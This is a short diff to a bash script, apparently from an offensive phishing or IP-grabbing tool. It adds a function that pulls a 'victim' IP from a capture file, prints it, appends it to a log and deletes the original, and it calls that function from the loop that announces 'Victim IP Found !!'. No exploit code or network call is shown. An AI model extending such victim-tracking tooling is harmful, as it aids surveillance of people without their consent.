@@ -76,7 +76,16 @@ banner
 menu
 fi
 }
+saveip() {	
 
+
+ip=$(grep -a 'IP:' victim-ip.txt | cut -d " " -f2 | tr -d '\r')	
+IFS=$'\n'	
+printf "\n"	
+printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m IP:\e[0m\e[1;96m %s\e[0m\n" $ip	
+cat victim-ip.txt >> ip.txt	
+
+}	
 victimfound() {
 
 printf "\n"
@@ -86,6 +95,8 @@ while [ true ]; do
 
 if [[ -e "victim-ip.txt" ]]; then
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !!\n"
+saveip	
+rm -rf victim-ip.txt
 
 fi
 
